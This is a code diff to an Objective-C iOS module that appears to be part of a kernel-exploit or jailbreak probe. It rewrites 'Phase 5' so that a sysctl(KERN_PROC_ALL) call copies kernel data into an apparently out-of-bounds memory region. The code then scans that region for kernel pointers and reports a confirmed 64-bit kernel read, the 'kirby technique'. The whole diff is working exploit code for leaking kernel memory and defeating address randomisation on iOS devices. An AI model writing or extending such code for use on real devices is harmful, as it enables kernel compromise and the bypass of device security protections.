@@ -2,6 +2,7 @@
 #import <UIKit/UIKit.h>
 #import "KPLog.h"
 #import <mach/mach.h>
+#include <sys/sysctl.h>
 
 @interface KPKReadProbeModule ()
 @property (nonatomic, copy) NSString *identifier;
@@ -160,28 +161,30 @@ static BOOL isKernelPointer(uint64_t v) {
         }
     }
 
-    // --- Phase 5: try to find kernel data via OOB ---
-    [report appendString:@"\n--- Phase 5: kernel data probe ---\n"];
-    [report appendString:@"(zero-filled region, waiting for kernel writes...)\n"];
+    // --- Phase 5: kernel pointers via sysctl copyout (kirby-style) ---
+    [report appendString:@"\n--- Phase 5: kernel pointers via sysctl copyout ---\n"];
+    for (size_t i = 0; i < regionSize / 8; i++) in64[i] = 0;
 
-    // Clear region and wait briefly
-    for (size_t i = 0; i < regionSize / 8; i++) {
-        in64[i] = 0;
-    }
-    usleep(50000); // 50ms
+    size_t sysctlSize = regionSize;
+    int mib[] = { CTL_KERN, KERN_PROC_ALL };
+    int ret = sysctl(mib, 2, (void *)inputAddr, &sysctlSize, NULL, 0);
+    [report appendFormat:@"sysctl(KERN_PROC_ALL) ret=%d size=%zu\n", ret, sysctlSize];
 
-    int kernelValues = 0;
-    for (size_t i = 0; i < regionSize / 8; i++) {
-        uint64_t v = out64[i];
-        if (v != 0) {
-            kernelValues++;
-            if (kernelValues <= 8) {
-                [report appendFormat:@"  [+0x%zx] = 0x%llx%s\n", i * 8, v,
-                 isKernelPointer(v) ? " (KERNEL PTR)" : ""];
+    if (ret == 0 && sysctlSize > 0) {
+        int kptr2 = 0;
+        for (size_t i = 0; i < sysctlSize / 8; i++) {
+            uint64_t v = out64[i];
+            if (isKernelPointer(v)) {
+                kptr2++;
+                if (kptr2 <= 10)
+                    [report appendFormat:@"  kread64 kptr[%d] @ +0x%zx: 0x%llx\n", kptr2-1, i*8, v];
             }
         }
+        [report appendFormat:@"kernel pointers in sysctl data: %d\n", kptr2];
+        if (kptr2 > 0) {
+            [report appendString:@"*** KREAD64 CONFIRMED (kirby technique) ***\n"];
+        }
     }
-    [report appendFormat:@"non-zero values after wait: %d\n", kernelValues];
 
     // --- Verdict ---
     [report appendString:@"\n"];
